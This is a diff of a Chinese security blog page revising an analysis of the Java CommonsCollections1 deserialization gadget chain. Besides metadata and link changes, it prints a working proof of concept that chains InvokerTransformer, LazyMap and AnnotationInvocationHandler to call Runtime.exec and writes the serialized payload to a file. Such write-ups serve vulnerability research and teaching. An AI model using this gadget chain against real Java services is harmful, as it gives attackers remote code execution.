@@ -6,37 +6,28 @@
   <meta name="keywords" content=" Hexo , Markdown ">
   <meta name="description" content="Java反序列化-CommonsCollections1分析 | 六月的雨">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-<meta name="description" content="jfinal_cms使用框架：jfinal框架(ActiveRecord进行数据库操作) 目录详情: api : ​            constant:定义了异常常量 ​            controller:web层 ​            from:javabean ​            interceptor: ​            service ​">
+<meta name="description" content="Java反序列化CommonsCollections3-5分析版本要求：  jdk1.7 Commons Collections 3.1  添加依赖：     &lt;dependency&gt;       &lt;groupId&gt;org.javassist&lt;&#x2F;groupId&gt;       &lt;artifactId&gt;javassist&lt;&#x2F;artifactId&amp;g">
 <meta property="og:type" content="article">
-<meta property="og:title" content="java代码审计-jfinal_cms">
-<meta property="og:url" content="http://example.com/2021/12/04/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-jfinal_cms/index.html">
+<meta property="og:title" content="Java反序列化-CommonsCollections3-5分析">
+<meta property="og:url" content="http://example.com/2021/12/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CommonsCollections3%E5%88%86%E6%9E%90/index.html">
 <meta property="og:site_name" content="六月的雨">
-<meta property="og:description" content="jfinal_cms使用框架：jfinal框架(ActiveRecord进行数据库操作) 目录详情: api : ​            constant:定义了异常常量 ​            controller:web层 ​            from:javabean ​            interceptor: ​            service ​">
+<meta property="og:description" content="Java反序列化CommonsCollections3-5分析版本要求：  jdk1.7 Commons Collections 3.1  添加依赖：     &lt;dependency&gt;       &lt;groupId&gt;org.javassist&lt;&#x2F;groupId&gt;       &lt;artifactId&gt;javassist&lt;&#x2F;artifactId&amp;g">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://raw.githubusercontent.com/JuneRainBlog/img/master/20201222130257-f4d23d12-4412-1.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/JuneRainBlog/img/master/20201222130257-f4d23d12-4412-1.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211204152207469.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211204152348702.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211204152413906.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211204160037257.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211204165039679.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211204165905186.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/JuneRainBlog/img/master/55565210-007ed380-572c-11e9-80fb-15f7f0927f9d.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211204171755671.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211204171819910.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211204171440280.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211204171515405.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211204171529482.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211209171954415.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/JuneRainBlog/img/master/1553855373933-w331s">
-<meta property="og:image" content="https://raw.githubusercontent.com/JuneRainBlog/img/master/1553855380054-w331s">
-<meta property="article:published_time" content="2021-12-04T06:12:12.000Z">
-<meta property="article:modified_time" content="2021-12-09T09:21:39.381Z">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211210151557527.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211210151857835.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211210152333632.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211210161612604.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211210175337100.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211210175443072.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211210175549699.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211210180112155.png">
+<meta property="article:published_time" content="2021-12-06T14:00:12.000Z">
+<meta property="article:modified_time" content="2021-12-12T12:36:43.988Z">
 <meta property="article:author" content="juneRain">
 <meta property="article:tag" content="Hexo">
 <meta property="article:tag" content="Markdown">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://raw.githubusercontent.com/JuneRainBlog/img/master/20201222130257-f4d23d12-4412-1.png">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211210151557527.png">
 
 
 <link rel="icon" href="/img/1.jpg">
@@ -250,7 +241,7 @@
     <li>
         <div class="all active" data-rel="All">All
             
-                <small>(27)</small>
+                <small>(24)</small>
             
         </div>
     </li>
@@ -303,7 +294,7 @@
                     <div data-rel="JAVA代码审计">
                         
                         JAVA代码审计
-                        <small>(17)</small>
+                        <small>(13)</small>
                         
                     </div>
                     
@@ -317,7 +308,7 @@
                     <div data-rel="Java反序列化">
                         
                         Java反序列化
-                        <small>(2)</small>
+                        <small>(3)</small>
                         
                     </div>
                     
@@ -359,8 +350,8 @@
         
     </div>
 </div>
-<input type="hidden" id="yelog_site_posts_number" value="27">
-<input type="hidden" id="yelog_site_word_count" value="32.3k">
+<input type="hidden" id="yelog_site_posts_number" value="24">
+<input type="hidden" id="yelog_site_word_count" value="34.3k">
 <div style="display: none">
     <span id="busuanzi_value_site_uv"></span>
     <span id="busuanzi_value_site_pv"></span>
@@ -425,6 +416,14 @@
            data-tag="Hexo,Markdown"
            data-author="" >
             <span class="post-title" title="Java反序列化-CommonsCollections2分析">Java反序列化-CommonsCollections2分析</span>
+            <span class="post-date" title="2021-12-06 22:00:12">2021/12/06</span>
+        </a>
+        
+        <a  class="All Java反序列化 "
+           href="/2021/12/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CommonsCollections3%E5%88%86%E6%9E%90/"
+           data-tag="Hexo,Markdown"
+           data-author="" >
+            <span class="post-title" title="Java反序列化-CommonsCollections3-5分析">Java反序列化-CommonsCollections3-5分析</span>
             <span class="post-date" title="2021-12-06 22:00:12">2021/12/06</span>
         </a>
         
@@ -501,30 +500,6 @@
         </a>
         
         <a  class="All JAVA代码审计 "
-           href="/2021/09/07/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SSM%E6%A1%86%E6%9E%B6-%E9%85%8D%E7%BD%AE%E6%95%B0%E6%8D%AE%E6%BA%90/"
-           data-tag="Hexo,Markdown"
-           data-author="" >
-            <span class="post-title" title="java代码审计-SSM框架-配置数据源">java代码审计-SSM框架-配置数据源</span>
-            <span class="post-date" title="2021-09-07 23:22:12">2021/09/07</span>
-        </a>
-        
-        <a  class="All JAVA代码审计 "
-           href="/2021/09/07/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SSM%E6%A1%86%E6%9E%B6-Spring%E6%B3%A8%E8%A7%A3%E5%BC%80%E5%8F%91/"
-           data-tag="Hexo,Markdown"
-           data-author="" >
-            <span class="post-title" title="java代码审计-SSM框架-Spring注解开发">java代码审计-SSM框架-Spring注解开发</span>
-            <span class="post-date" title="2021-09-07 23:22:12">2021/09/07</span>
-        </a>
-        
-        <a  class="All JAVA代码审计 "
-           href="/2021/09/07/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SSM%E6%A1%86%E6%9E%B6-%E6%8B%A6%E6%88%AA%E5%99%A8/"
-           data-tag="Hexo,Markdown"
-           data-author="" >
-            <span class="post-title" title="java代码审计-SSM框架-拦截器">java代码审计-SSM框架-拦截器</span>
-            <span class="post-date" title="2021-09-07 23:22:12">2021/09/07</span>
-        </a>
-        
-        <a  class="All JAVA代码审计 "
            href="/2021/09/07/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E6%8A%A5%E9%94%991/"
            data-tag="Hexo,Markdown"
            data-author="" >
@@ -538,14 +513,6 @@
            data-author="" >
             <span class="post-title" title="java代码审计-Error creating bean with name &#39;org.springframework.web.servlet.mvc.method.an解决方法">java代码审计-Error creating bean with name &#39;org.springframework.web.servlet.mvc.method.an解决方法</span>
             <span class="post-date" title="2021-09-07 23:22:12">2021/09/07</span>
-        </a>
-        
-        <a  class="All JAVA代码审计 "
-           href="/2021/09/07/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SSM%E6%A1%86%E6%9E%B6-Spring%E5%85%A5%E9%97%A8%E9%85%8D%E7%BD%AE/"
-           data-tag="Hexo,Markdown"
-           data-author="" >
-            <span class="post-title" title="java代码审计-SSM框架-Spring入门配置">java代码审计-SSM框架-Spring入门配置</span>
-            <span class="post-date" title="2021-09-07 20:16:12">2021/09/07</span>
         </a>
         
         <a  class="All JAVA代码审计 "
@@ -683,12 +650,12 @@
     </div>
     <div class="article-meta">
         
-            Created At : <time class="date" title='Updated At: 2021-12-08 16:39:44'>2021-12-01 15:38</time>
+            Created At : <time class="date" title='Updated At: 2021-12-12 20:34:32'>2021-12-01 15:38</time>
         
     </div>
     <div class="article-meta">
         
-        <span>Count:2.3k</span>
+        <span>Count:2.1k</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -718,7 +685,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CommonsCollections1%E5%88%86%E6%9E%90"><span class="toc-text">Java反序列化CommonsCollections1分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-text">0x01利用链</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E5%90%8E%E5%8D%8A%E6%9D%A1%E9%93%BE%E8%BF%9B%E8%A1%8C%E5%88%86%E6%9E%90%EF%BC%9A"><span class="toc-text">0x02 后半条链进行分析：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%96%91%E9%97%AE"><span class="toc-text">疑问</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03%E5%89%8D%E5%8D%8A%E9%83%A8%E9%93%BE%E8%BF%9B%E8%A1%8C%E5%88%86%E6%9E%90%EF%BC%9A"><span class="toc-text">0x03前半部链进行分析：</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CommonsCollections1%E5%88%86%E6%9E%90"><span class="toc-text">Java反序列化CommonsCollections1分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-text">0x01利用链</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E5%90%8E%E5%8D%8A%E6%9D%A1%E9%93%BE%E8%BF%9B%E8%A1%8C%E5%88%86%E6%9E%90%EF%BC%9A"><span class="toc-text">0x02 后半条链进行分析：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03%E5%89%8D%E5%8D%8A%E9%83%A8%E9%93%BE%E8%BF%9B%E8%A1%8C%E5%88%86%E6%9E%90%EF%BC%9A"><span class="toc-text">0x03前半部链进行分析：</span></a></li></ol></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -763,34 +730,44 @@
 </code></pre>
 <h2 id="0x02-后半条链进行分析："><a href="#0x02-后半条链进行分析：" class="headerlink" title="0x02 后半条链进行分析："></a>0x02 后半条链进行分析：</h2><p>这里先对后半条链进行分析，然后使用反推思想再去分析为什么需要前半条链</p>
 <p>在commons collections中有一个Transformer接口，其中包含一个transform方法，通过实现此接口来达到类型转换的目的。</p>
-<p><img src="http://tva1.sinaimg.cn/large/006yXVokgy1gx0x9e3phhj30ac04qdg3.jpg"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/006yXVokgy1gx0x9e3phhj30ac04qdg3.jpg"></p>
 <p>接口没办法直接调用，我们需要去找它的实现类，cc1中主要利用了以下三个</p>
 <ul>
 <li><p>InvokerTransformer：其transform方法实现了通过反射来调用某方法</p>
-<p><img src="http://tva1.sinaimg.cn/large/006yXVokgy1gx0xa90lsqj310u0ag77g.jpg"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/006yXVokgy1gx0xa90lsqj310u0ag77g.jpg"></p>
 </li>
 <li><p>ConstantTransformer：其transform方法将输入原封不动的返回</p>
 </li>
 </ul>
-<p><img src="https://raw.githubusercontent.com/JuneRainBlog/img/master/006yXVokgy1gwx97lg2xij30rg02awfn.jpg"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211212202653834.png" alt="image-20211212202653834"></p>
 <ul>
 <li><p>ChainedTransformer：其transform方法实现了对每个传入的transformer都调用其transform方法，并将结果作为下一次的输入传递进去</p>
-<p><img src="https://raw.githubusercontent.com/JuneRainBlog/img/master/006yXVokgy1gwx993s92yj30gr04q3ze.jpg"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211212202715732.png" alt="image-20211212202715732"></p>
 </li>
 </ul>
 <p>所以demo可以这样编写</p>
-<p><img src="https://raw.githubusercontent.com/JuneRainBlog/img/master/006yXVokgy1gwxhn1t48nj30xb04htc8.jpg"></p>
-<p>第一个疑问：为啥要用三个类组成链去实现Runtime方法</p>
-<p>是因为Runtime没有继承Serializable，所以不可以在客户端被序列化到本地,也就没法进行后续的反序列化操作了，这里需要使用反射调用，而这里逻辑思路是:</p>
-<p>ConstantTransformer会将Runtime.class传给 –&gt; </p>
-<p>第一个InvokerTransformer() 是调用getMethod方法获取了getRuntime这个Method对象–&gt;</p>
-<p>第二个InvokerTransformer() 通过Invoke获取getRuntime的执行结果–&gt;</p>
-<p>第三个InvokerTransformer()。而它们为什么会一直传下去，是因为ChainedTransformer的作用。</p>
-<h3 id="疑问"><a href="#疑问" class="headerlink" title="疑问"></a>疑问</h3><p>小知识点：</p>
-<p>invoke</p>
+<pre><code>ChainedTransformer chain = new ChainedTransformer(new Transformer[] &#123;
+        new ConstantTransformer(Runtime.class), 
+        new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;&quot;getRuntime&quot;, new Class[0] &#125;), 
+        new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;Object.class, Object[].class &#125;, new Object[] &#123;null, new Object[0] &#125;),     
+        new InvokerTransformer(&quot;exec&quot;, new Class[] &#123; String.class &#125;, new Object[]&#123;&quot;calc&quot;&#125;)&#125;);//MAC&quot;calc&quot;换成&quot;open -a Calculator&quot; 
+</code></pre>
+<p>小知识点：</p>
+<p>getClass() ：获取运行对象的类</p>
+<p>查看对应的资料发现 getClass()根据传入参数的不同返回数据也会有不同</p>
 <ol>
-<li>invoke调用普通方法时，传入的必须是实例化后的类</li>
-<li>invoke调用静态方法时，传入类即可</li>
+<li><p>如果传入的是对象， 那么返回的就是当前对象的类</p>
+</li>
+<li><p>如果传入的是类，那么返回的就是 java.lang.Class</p>
+<p><img src="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211212203145967.png" alt="image-20211212203145967"></p>
+</li>
+</ol>
+<p>invoke:</p>
+<ol>
+<li><p>invoke调用普通方法时，传入的必须是实例化后的类</p>
+</li>
+<li><p>invoke调用静态方法时，传入类即可</p>
+</li>
 </ol>
 <p>第一个疑问：为啥不使用InvokerTransformer+反射获取获取Runtime对象，造成RCE呢，下面有Demo代码，可以看到可以弹计算器。</p>
 <pre><code>InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;);
@@ -798,30 +775,7 @@ Object obj = Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRun
 invokerTransformer.transform(obj);
 </code></pre>
 <p><img src="https://raw.githubusercontent.com/JuneRainBlog/img/master/006yXVokgy1gwy5xeyyowj30x10ihtel.jpg"></p>
-<p>原因是：Runtime没有继承Serializable，所以不可以在客户端被序列化到本地,也就没法进行后续的反序列化操作了，这里需要通过一个可以反序列化类使用反射调用</p>
-<p>第二个疑问：这样写不可以吗</p>
-<pre><code>      Transformer[] transformers = new Transformer[]&#123;
-               new ConstantTransformer(Runtime.getRuntime()),
-               new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)
-      &#125;;
-       ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
-       chainedTransformer.transform(111);
-</code></pre>
-<p>首先创建Transformer[] 数组,然后将ConstantTransformer 和 InvokerTransformer 作为元素传入,Runtime.getRuntime() 会返回一个Runtime对象，然后利用ConstantTransformer的transform方法直接返回，作为输入传递给InvokerTransformer，利用反射调用Runtime对象中的exec方法进行命令执行,将前面的Transformer数组传入ChainedTransformer，并且调用transform。</p>
-<p><img src="https://raw.githubusercontent.com/JuneRainBlog/img/master/006yXVokgy1gwy6eem9hfj314j04mtc1.jpg"></p>
-<p>ps：由于ConstantTransformer类中的transform方法的输入并不会影响输出，所以<code>chainedTransformer.transform(111);</code>可以传入入任意数值</p>
-<p>原因：</p>
-<p><img src="https://raw.githubusercontent.com/JuneRainBlog/img/master/006yXVokgy1gwy6h9s2gcj30qo04etbd.jpg"></p>
-<p>打断点发现，我们传入的为java.lang.Runtime 但是在经过 input.getClass之后返回的是 java.lang.Class，所以导致出现了之前的报错</p>
-<p>getClass() ：获取运行对象的类</p>
-<p>查看对应的资料发现 getClass()根据传入参数的不同返回数据也会有不同</p>
-<ol>
-<li>如果传入的是对象， 那么返回的就是当前对象的类</li>
-<li>如果传入的是类，那么返回的就是 java.lang.Class</li>
-</ol>
-<p><img src="https://raw.githubusercontent.com/JuneRainBlog/img/master/006yXVokgy1gwy6m5hmadj30ex0bcq6a.jpg"></p>
-<p>结论：</p>
-<p>上面我们已经知道了在经过 <code>Class cls = input.getClass();</code> 之后返回的只会是java.lang.Class，那么我们可以利用Class中的getMethod来获取Runtime中的getRuntime方法，然后再利用反射中调用invoke进行执行，从而返回Runtime实例</p>
+<p>原因是：Runtime没有继承Serializable，所以不可以在客户端被序列化到本地,也就没法进行后续的反序列化操作了，这里需要通过一个可以反序列化类使用反射调用。</p>
 <p>最终的POC</p>
 <pre><code>ChainedTransformer chain = new ChainedTransformer(new Transformer[] &#123;
         new ConstantTransformer(Runtime.class), 
@@ -835,9 +789,10 @@ invokerTransformer.transform(obj);
 </code></pre>
 <p>到这里后半段的链分析完了，而我们的目的是在调用readObject的时候就触发rce，也就是说我们现在需要找到一个点调用了transform方法（如果能找到在readObject后就调用那是最好的），如果找不到在readObject里调用transform方法，那么就需要找到一条链，在readObject触发起点，接着一步步调用到了transform方法。</p>
 <p>我们找到Lazymap#get这个方法中调用了transform，但是我们怎么去调用Lazymap#get这个方法呢，所以我们就有了前半条链，拼接前半条链+Lazymap#get+后半条链</p>
-<p><img src="https://raw.githubusercontent.com/JuneRainBlog/img/master/006yXVokgy1gwxi06ktemj30g705oq47.jpg"></p>
+<p>Lazymap#get</p>
+<p><img src="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211212203351043.png" alt="image-20211212203351043"></p>
 <p>这里的是this.factory可控的，我们可以通过创建LazyMap实例的方式来设置他的值</p>
-<p><img src="http://tva1.sinaimg.cn/large/006yXVokgy1gwyeox36nbj30hr052jsu.jpg"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211212203424838.png" alt="image-20211212203424838"></p>
 <pre><code>public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException, NoSuchFieldException &#123;
           ChainedTransformer chain = new ChainedTransformer(new Transformer[] &#123;
                   new ConstantTransformer(Runtime.class),
@@ -859,15 +814,22 @@ invokerTransformer.transform(obj);
           map.get(123);
      &#125;
 </code></pre>
-<p>PS：这里使用反射，因为Lazy构造方法中，是protected，而不是product，所以需要用反射来调用</p>
-<h2 id="0x03前半部链进行分析："><a href="#0x03前半部链进行分析：" class="headerlink" title="0x03前半部链进行分析："></a>0x03前半部链进行分析：</h2><p>目的：寻找重写了readObject()并调用MapEntry类的get方法</p>
-<p>如果Java应用没有对传入的序列化数据进行安全性检查，可以将恶意的TransformedMap序列化后，远程提交给Java应用，如果Java应用可以触发变换，即可成功远程命令执行。结合前述Commons Collections的特性，如果某个可序列化的类重写了readObject()方法，并且在readObject()中调用MapEntry类的get方法，并且这个Map变量是可控的，就可以远程命令执行。于是找到了这个类：AnnotationInvocationHandler</p>
-<p>前半部链AnnotationInvocationHandler，用于触发LazyMap的get方法。AnnotationInvocationHandler是一个代理类，并且可以序列化，且实现了readObject，所以但我们服务端存在可控的readObject的时候，我们使用AnnotationInvocationHandler这条链，服务端会使用AnnotationInvocationHandler的重写readObject，触发后续的RCE。</p>
-<p><img src="https://raw.githubusercontent.com/JuneRainBlog/img/master/006yXVokgy1gwycp9d2yjj30l903bq52.jpg"></p>
-<p><img src="https://raw.githubusercontent.com/JuneRainBlog/img/master/006yXVokgy1gwycs6ry7uj30qc07zgpg.jpg"></p>
-<p>这里的readObject又调用了this.memberValues的entrySet方法。如果这里的memberValues是个代理类，那么就会调用memberValues对应handler的invoke方法，cc1中将handler设置为AnnotationInvocationHandler</p>
-<p><img src="https://raw.githubusercontent.com/JuneRainBlog/img/master/006yXVokgy1gwycynft1cj30qy0m8dma.jpg"></p>
-<p>如果var4是我们的被代理类map。这里对this.memberValues调用了get方法，就是调用被代理类map的get方法，那么就会触发LazyMap#get，从而完成触发rce。</p>
+<p>PS：这里使用反射，因为LazyMap构造方法中，是protected，而不是product，所以需要用反射来调用</p>
+<p><img src="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/t018bcb045a00f7c525.png" alt="img"></p>
+<h2 id="0x03前半部链进行分析："><a href="#0x03前半部链进行分析：" class="headerlink" title="0x03前半部链进行分析："></a>0x03前半部链进行分析：</h2><p>目的：寻找重写了readObject()并调用LazyMap类的get方法</p>
+<p>前半部链AnnotationInvocationHandler，用于触发LazyMap的get方法。AnnotationInvocationHandler是一个代理类，并且可以序列化，且重写了readObject，所以当我们服务端存在可控的readObject方法的时候，，服务端会执行AnnotationInvocationHandler重写的readObject，触发后续的RCE。</p>
+<p>AnnotationInvocationHandler#readObject</p>
+<p><img src="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211211110930039.png" alt="image-20211211110930039"></p>
+<p>关键点来了，是怎么进入AnnotationInvocationHandler#invoke 方法中呢？</p>
+<p>因为实际上这个类实际就是一个InvocationHandler，我们如果将这个对象用Proxy进行代理，那么在readObject的时候，只要调用任意方法，就会进入到 AnnotationInvocationHandler#invoke 方法中，进而触发我们的LazyMap#get 。</p>
+<pre><code>Constructor handler_constructor = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;).getDeclaredConstructor(Class.class,Map.class);//反射创建AnnotationInvocationHandler的Class，并调用带参构造器
+handler_constructor.setAccessible(true);
+InvocationHandler map_handler = (InvocationHandler) handler_constructor.newInstance(Override.class,map); //被代理对象
+</code></pre>
+<p>AnnotationInvocationHandler#invoke</p>
+<p><img src="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211212201512078.png" alt="image-20211212201512078"></p>
+<p>而this.memberValues是可控的，就是传入的形参，所以我们可以传入LazyMap，就可以在invoke方法中触发，LazyMap.get()。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211212201648730.png" alt="image-20211212201648730"></p>
 <p>最终代码：</p>
 <pre><code>public class cc1 &#123;
     public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException, NoSuchFieldException &#123;
@@ -893,12 +855,9 @@ invokerTransformer.transform(obj);
 
         Map proxy_map = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),new Class[]&#123;Map.class&#125;,map_handler); //创建proxy对象
 
-
         Constructor AnnotationInvocationHandler_Constructor = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;).getDeclaredConstructor(Class.class,Map.class);
         AnnotationInvocationHandler_Constructor.setAccessible(true);
         InvocationHandler handler = (InvocationHandler)AnnotationInvocationHandler_Constructor.newInstance(Override.class,proxy_map);//使用构造器创建对象，传入proxy_map
-
-
 
         try&#123;
             ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(&quot;./cc1&quot;));
@@ -914,9 +873,19 @@ invokerTransformer.transform(obj);
     &#125;
 &#125;
 </code></pre>
-<p>疑问：为什么创建AnnotationInvocationHandler实例时传入的第一个参数是Override.class?</p>
+<p>疑问：</p>
+<p>1.为什么创建AnnotationInvocationHandler实例时传入的第一个参数是Override.class?</p>
 <p>因为传入第一个参数调用了isAnnotation判断是否是注解类，并且这里的注解类需要使用java自带的</p>
-<p><img src="https://raw.githubusercontent.com/JuneRainBlog/img/master/006yXVokgy1gwydbqp7ijj30mk09ewja.jpg"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211212202350268.png" alt="image-20211212202350268"></p>
+<p>2.为什么已经创建了代理对象proxyMap了，还需要创建AnnotationInvocationHandler的实例对象。</p>
+<pre><code>Constructor handler_constructor = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;).getDeclaredConstructor(Class.class,Map.class)
+handler_constructor.setAccessible(true);
+InvocationHandler map_handler = (InvocationHandler) handler_constructor.newInstance(Override.class,map);
+
+Map proxy_map = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),new Class[]&#123;Map.class&#125;,map_handler); 
+InvocationHandler handler = (InvocationHandler)handler_constructor.newInstance(Override.class,proxy_map);
+</code></pre>
+<p>代理后的对象叫做proxy_map，但我们不能直接对其进行序列化，因为我们入口点是sun.reflect.annotation.AnnotationInvocationHandler#readObject ，所以我们还需要再用AnnotationInvocationHandler对这个proxyMap进行包裹。</p>
 <p>参考链接：</p>
 <p><a target="_blank" rel="noopener" href="https://paper.seebug.org/1251/">https://paper.seebug.org/1251/</a></p>
 <p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=Mzg3OTU3MzI4Mg==&amp;mid=2247483769&amp;idx=1&amp;sn=48eba9031c5fcc2f10d6f830fdd28eeb&amp;chksm=cf032134f874a822ac197cbe3d91d745caa1f6e0cc7d74d1c188147468f6faf00e5a89f297a0&amp;token=1815809254&amp;lang=zh_CN#rd">https://mp.weixin.qq.com/s?__biz=Mzg3OTU3MzI4Mg==&amp;mid=2247483769&amp;idx=1&amp;sn=48eba9031c5fcc2f10d6f830fdd28eeb&amp;chksm=cf032134f874a822ac197cbe3d91d745caa1f6e0cc7d74d1c188147468f6faf00e5a89f297a0&amp;token=1815809254&amp;lang=zh_CN#rd</a></p>
@@ -934,10 +903,10 @@ invokerTransformer.transform(obj);
 
 <div class="article_copyright">
     <p><span class="copy-title">Title:</span>Java反序列化-CommonsCollections1分析</p>
-    <p><span class="copy-title">Count:</span><span class="post-count">2.3k</span></p>
+    <p><span class="copy-title">Count:</span><span class="post-count">2.1k</span></p>
     <p><span class="copy-title">Author:</span><a  title="juneRain">juneRain</a></p>
     <p><span class="copy-title">Created At:</span>2021-12-01, 15:38:12</p>
-    <p><span class="copy-title">Updated At:</span>2021-12-08, 16:39:44</p>
+    <p><span class="copy-title">Updated At:</span>2021-12-12, 20:34:32</p>
     <span class="copy-title">Url:</span><a class="post-url" href="/2021/12/01/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CommonsCollections1%E5%88%86%E6%9E%90/" title="Java反序列化-CommonsCollections1分析">http://example.com/2021/12/01/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CommonsCollections1%E5%88%86%E6%9E%90/</a>
     <p>
         <span class="copy-title">Copyright:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">&#39;Attribution-non-commercial-shared in the same way 4.0&#39;</a> Reprint please keep the original link and author.
